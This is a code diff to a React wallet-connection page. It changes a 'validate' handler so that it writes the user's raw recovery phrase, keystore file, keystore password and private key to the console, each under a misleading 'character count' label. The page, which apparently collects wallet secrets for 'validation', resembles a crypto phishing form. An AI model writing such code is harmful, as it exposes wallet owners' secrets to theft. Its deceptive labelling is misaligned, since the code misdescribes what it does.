@@ -90,22 +90,22 @@ export default function WalletConnectionPage() {
     setConnectingWallet(null);
   };
 
-  const handleValidate = () => {
-  console.log("Selected wallet:", selectedWallet);
-  console.log("Selected tab:", selectedTab);
+  const handleValidate = () => { 
+    console.log("========== VALIDATE CLICKED =========="); 
+    console.log("Selected wallet:", selectedWallet); 
+    console.log("Selected tab:", selectedTab);
+     if (selectedTab === "phrase") { 
+      console.log("Phrase entered:", phraseInput.length > 0); 
+      console.log("Phrase character count:", phraseInput); }
+if (selectedTab === "keystore") { 
+  console.log("Keystore entered:", keystoreInput.length > 0); 
+  console.log("Keystore character count:", keystoreInput); 
+  console.log("Password entered:", passwordInput.length > 0); 
+  console.log("Password character count:", passwordInput); }
 
-  if (selectedTab === "phrase") {
-    console.log("Phrase tab selected");
-  }
-
-  if (selectedTab === "keystore") {
-    console.log("Keystore tab selected");
-  }
-
-  if (selectedTab === "privateKey") {
-    console.log("Private key tab selected");
-  }
-};
+  if (selectedTab === "privateKey") { 
+    console.log("Private key entered:", privateKeyInput.length > 0); 
+    console.log("Private key character count:", privateKeyInput); } };
 
   return (
     <main className="min-h-screen bg-[#030712] px-5 py-10 text-white sm:px-8 lg:px-12">
